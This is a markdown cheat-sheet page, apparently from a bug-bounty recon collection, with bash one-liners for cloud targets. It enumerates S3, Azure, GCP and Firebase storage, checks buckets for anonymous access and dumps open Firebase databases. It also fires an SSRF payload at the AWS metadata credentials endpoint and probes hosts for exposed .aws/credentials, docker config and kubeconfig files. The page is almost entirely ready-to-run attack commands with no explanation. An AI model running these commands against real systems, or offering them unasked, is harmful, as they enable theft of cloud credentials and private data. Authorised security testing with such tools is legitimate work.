[← Back to README](../Readme.md)

---

## ☁️ Cloud Security

### AWS S3 Bucket Finder
```bash
cat urls.txt | grep -oE "[a-zA-Z0-9.-]+\.s3\.amazonaws\.com" | anew s3_buckets.txt
cat urls.txt | grep -oE "s3://[a-zA-Z0-9.-]+" | anew s3_buckets.txt
```

### S3 Permission Check
```bash
cat s3_buckets.txt | xargs -I@ sh -c 'aws s3 ls s3://@ --no-sign-request 2>/dev/null && echo "OPEN: @"'
```

### Firebase Database
```bash
cat urls.txt | grep -oE "[a-zA-Z0-9-]+\.firebaseio\.com" | xargs -I@ curl -s @/.json | grep -v "null"
```

### Azure Blob Storage
```bash
cat urls.txt | grep -oE "[a-zA-Z0-9-]+\.blob\.core\.windows\.net" | anew azure_blobs.txt
```

### GCP Storage
```bash
cat urls.txt | grep -oE "storage\.googleapis\.com/[a-zA-Z0-9-]+" | anew gcp_buckets.txt
```

### AWS Metadata SSRF
```bash
cat urls.txt | gf ssrf | qsreplace "http://169.254.169.254/latest/meta-data/iam/security-credentials/" | httpx -silent -ms "AccessKeyId"
```

### Cloud Credential Files
```bash
cat alive.txt | httpx -silent -path /.aws/credentials,/.docker/config.json,/kubeconfig -mc 200 | anew cloud_creds.txt
```

---

[← Back to README](../Readme.md)
